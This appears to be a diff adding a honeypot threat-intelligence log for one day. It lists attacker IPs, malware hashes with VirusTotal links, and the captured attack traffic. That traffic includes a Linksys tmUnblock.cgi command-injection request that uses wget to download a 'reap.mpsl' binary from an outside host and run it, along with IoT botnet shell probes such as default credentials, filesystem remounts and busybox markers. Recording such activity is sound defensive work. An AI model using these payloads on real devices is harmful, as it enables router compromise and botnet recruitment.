@@ -1,0 +1,63 @@
+Top 5 IPs for 04-07-2024 :
+
+42.191.203.214
+222.252.21.30
+8.218.89.123
+14.99.254.18
+34.92.198.176
+
+Malware Observed:
+
+
+File name : sshd
+82ca2fd57a52bc8baa1aa1053c578503da316a41b86b4d2ea6242866fcebadde
+https://www.virustotal.com/gui/file/82ca2fd57a52bc8baa1aa1053c578503da316a41b86b4d2ea6242866fcebadde
+
+
+File name : xinetd
+f71db7e25e720622d7c160761f5c50f72a0c57cd2e87646318df24b368ac1612
+https://www.virustotal.com/gui/file/f71db7e25e720622d7c160761f5c50f72a0c57cd2e87646318df24b368ac1612
+
+
+
+Commands/exploits observed:
+
+POST /tmUnblock.cgi HTTP/1.1
+Host: 213.202.208.9:80
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: /
+User-Agent: python-requests/2.20.0
+Content-Length: 227
+Content-Type: application/x-www-form-urlencoded
+
+ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F213.202.208.9%2Freaper%2Freap.mpsl%3B+chmod+777+reap.mpsl%3B+.%2Freap.mpsl+Reaper.linksys%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1
+
+
+ubnt
+ubnt
+enable
+system
+shell
+sh
+ping; sh
+mount -o remount,rw,exec /; >/.a && cd /;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /var/; >/var/.a && cd /var/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /mnt/; >/mnt/.a && cd /mnt/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /var/run/; >/var/run/.a && cd /var/run/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /etc/; >/etc/.a && cd /etc/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /dev/; >/dev/.a && cd /dev/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /tmp/; >/tmp/.a && cd /tmp/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /dev/shm/; >/dev/shm/.a && cd /dev/shm/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+mount -o remount,rw,exec /var/home/user/fw/; >/var/home/user/fw/.a && cd /var/home/user/fw/;(/bin/busybox echo -e "\\x44\\x49\\x52"||echo -e "\\x44\\x49\\x52")
+for p in `cat /proc/mounts|grep tmpfs|cut -d ' ' -f 2`;do cat $SHELL >$p/.a&&cd $p;rm .a;done;(echo -e "\\x44\\x49\\x52"||/bin/busybox echo -e "\\x44\\x49\\x52")
+rm -rf .f; >.f; (cp $SHELL .f || /bin/busybox cp /bin/busybox .f || chmod 777 .f); >.f||rm -rf .f
+rm -rf .d; >.d; (cp $SHELL .d || /bin/busybox cp /bin/busybox .d || chmod 777 .d); >.d||rm -rf .d
+(/bin/busybox wget --help||wget --help)&&echo -e "\\x57\\x47\\x45\\x54"||(/bin/busybox ftpget --help||ftpget --help)&&echo -e "\\x46\\x54\\x50"||echo -en "\\x45\\x43\\x48\\x4f"
+
+
+
+
+
+
+
